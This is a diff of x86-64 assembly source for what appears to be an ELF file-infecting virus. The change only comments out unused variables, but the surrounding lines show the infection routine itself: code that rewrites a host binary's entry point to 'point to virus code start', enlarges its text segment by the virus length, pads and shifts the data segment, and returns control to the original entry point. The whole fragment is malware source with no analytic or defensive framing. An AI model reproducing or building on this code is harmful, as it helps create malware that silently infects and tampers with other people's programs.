@@ -422,22 +422,22 @@ evaddr: dq 0
 oshoff: dq 0
 
 hostentry_offset: dd 0
-hosttext_start: dd 0
+;hosttext_start: dd 0
 
 intermediary_ptload_segment_offset: dq 0
 
-data_offset_new_padding: dd 0
-data_offset_og: dd 0
-data_offset_original: dq 0
-data_offset_padding_size: dd 0
+;data_offset_new_padding: dd 0
+;data_offset_og: dd 0
+;data_offset_original: dq 0
+;data_offset_padding_size: dd 0
 
-vxhostentry: dq 0
+;vxhostentry: dq 0
 vxoffset: dd 0
-vxdatasegment: dd 0
+;vxdatasegment: dd 0
 vxshoff: dd 0
 ventry equ $_start 
 
-num_pages: dd 0
+;num_pages: dd 0
 vx_padding_size: dd 0
 ;num_pages_padding equ (num_pages * PAGESIZE)
 
@@ -914,7 +914,7 @@ infect:
 														;new entry point of infected file = evaddr + ventry
 					mov qword [r13 + 24], r10			; update ELF header entry point to point to virus code start
 					mov r10, [r13 + r12 + 8]			;elf_phdr.p_offset  
-					mov dword [hosttext_start], r10d
+					;mov dword [hosttext_start], r10d
 					add r10, [r13 + r12 + 32]			;elf_phdr.p_filesz offset
 					mov dword [vxoffset], r10d
 					add qword [r13 + r12 + 32], vlen	;elf_phdr.p_filesz offset
@@ -922,11 +922,11 @@ infect:
 					jmp .next_phdr						;this jmp might be unneccessary but adding it for testing	
 				.mod_phdr_data_segment:			
 					mov r11, [r13 + r12 + 8]			;elf_phdr.p_offset  
-					mov dword [data_offset_og],  r11d
-					mov qword [data_offset_original], r11
+					;mov dword [data_offset_og],  r11d
+					;mov qword [data_offset_original], r11
 					add dword r11d, [PAGESIZE]
 					mov dword [r13 + r12 + 8], r11d		;elf_phdr.p_offset
-					mov dword [data_offset_new_padding],  r11d
+					;mov dword [data_offset_new_padding],  r11d
 					jmp .next_phdr				;this jmp might be unneccessary but adding it for testing
 				.mod_other_ptload_phdr:
 					mov r11, [r13 + r12 + 8]			;elf_phdr.p_offset  
@@ -1119,9 +1119,9 @@ frankenstein_elf:
 		mov r10d, dword [vxoffset]
 		add r10d, dword vlen				;file offset adjusted to vxoffset+vlen
 		add r10d, 6							;add 6 bytes for push/ret original entrypoint
-		mov dword [vxdatasegment], r10d
+		;mov dword [vxdatasegment], r10d
 		shr r10d, 12						;divide file offset size by PAGESIZE
-		mov dword [num_pages], r10d			;to calculate the number of pages to pad the file		
+		;mov dword [num_pages], r10d			;to calculate the number of pages to pad the file		
 		xor rax, rax
 		mov eax, dword [PAGESIZE]
 		imul r10d
